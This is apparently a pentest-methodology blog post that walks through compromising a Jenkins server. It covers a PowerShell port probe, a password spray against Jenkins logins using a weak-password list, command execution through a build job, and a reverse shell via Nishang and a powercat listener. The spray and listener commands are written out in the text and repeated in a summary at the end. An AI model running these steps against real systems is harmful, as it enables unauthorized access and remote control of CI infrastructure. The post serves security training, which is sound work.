---
title: "Active Directory - Jenkins"
tags: [Metodologies]
categories: ActiveDirectory
mermaid: true
image: https://www.safesystems.com/wp-content/uploads/2020/04/Microsofts-LDAP-Security-Update-and-the-Impact-on-Financial-Institutions-Today-Header-Blog-Image.png
---

# Active Directory - Jenkins

Here you will find some commands to explore Active Directory Jenkins

Commands linked to Jenkins Attack. An excellent way to keep the access on.

Hope you enjoy.

# Summary

- [Active Directory - Jenkins](#active-directory---jenkins)
- [Summary](#summary)
- [Initial Consideration](#initial-consideration)
- [Port Scan](#port-scan)
- [Acessing Jenkins](#acessing-jenkins)
  - [BruteForce](#bruteforce)
  - [Logging on the App](#logging-on-the-app)
  - [Getting RCE](#getting-rce)
  - [Getting Reverse Shell](#getting-reverse-shell)
- [Concluion](#concluion)
  - [Commands Resume](#commands-resume)

![](https://0x4rt3mis.github.io/assets/img/active-enum/jenkins.png)

# Initial Consideration

Well, now let's explore the Jenkins server that is on the machine in order to get access to it.

What is `Jenkins`?

It is an automated, continuous integration tool that brings many benefits. Its main functionality is to build the project completely automatically, running the available tests, in order to detect errors in advance, reducing risks.

# Port Scan

We don't necessarily need to perform a port scan, as Jenkins works natively on port 8080, but it's just the case for knowledge

```ps1
8080 | % {echo ((new-object Net.Sockets.TcpClient).Connect("ip",$_)) "Port $_ is open!"} 2>$null
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/jenkins1.png)

So if you wanted a range of ports, it would be 1..6000 for example instead of 8080

# Acessing Jenkins

Once we know that something is running on port 8080, let's check if it really is a Jenkins server

![](https://0x4rt3mis.github.io/assets/img/active-enum/jenkins2.png)

Yes, we confirm it's a jenkins!

## BruteForce

After enumerating a little we found several users, but none of us have the password, so let's perform a brute force so we can access the jenkins command panel and thus gain RCE

The script used is this

[Brute Force Jenkins](https://github.com/chryzsh/JenkinsPasswordSpray)

Now we perform Brute Force

```ps1
Invoke-JenkinsPasswordSpray -URL http://ip:8080 -UsernameFile .\users.txt -PasswordFile .\10k-worst-passwords.txt -ContinueOnSuccess $true -Force -Outfile .\sprayed-jenkins.txt
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/jenkins3.png)

Well, after a while we got a credential!

## Logging on the App

With the credential, we log in!

![](https://0x4rt3mis.github.io/assets/img/active-enum/jenkins4.png)

![](https://0x4rt3mis.github.io/assets/img/active-enum/jenkins5.png)

## Getting RCE

We added a Job for executing commands

![](https://0x4rt3mis.github.io/assets/img/active-enum/jenkins6.png)

Now just get a reverse shell there!

We will use Nishang's `Invoke-PowerShellTCP.ps1`

[PowerShellTCP](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

The `HFS` to host your web server where the remote server will make requests

[HFS](https://www.rejetto.com/hfs/)

And the `powercat` to receive the reverse connection

[PowerCat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1)

We set powercat on port 443 to receive the reverse connection

```ps1
powercat -l -v -p 443 -t 1000
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/rev.png)

We fix it (we put the function call at the end of it to automatically run the reverse shell) and upload the Invoke-PowerShellTCP.ps1 into the HFS

![](https://0x4rt3mis.github.io/assets/img/active-enum/rev1.png)

## Getting Reverse Shell

We run and get a reverse shell by clicking `Build Now` inside the project that has been changed!

![](https://0x4rt3mis.github.io/assets/img/active-enum/jenkins7.png)

# Concluion

Here's a simple way to get access to a machine running a Jenkins server!

## Commands Resume

```ps1
8080 | % {echo ((new-object Net.Sockets.TcpClient).Connect("ip",$_)) "Port $_ is open!"} 2>$null
Invoke-JenkinsPasswordSpray -URL http://ip:8080 -UsernameFile .\users.txt -PasswordFile .\10k-worst-passwords.txt -ContinueOnSuccess $true -Force -Outfile .\sprayed-jenkins.txt
powercat -l -v -p 443 -t 1000
```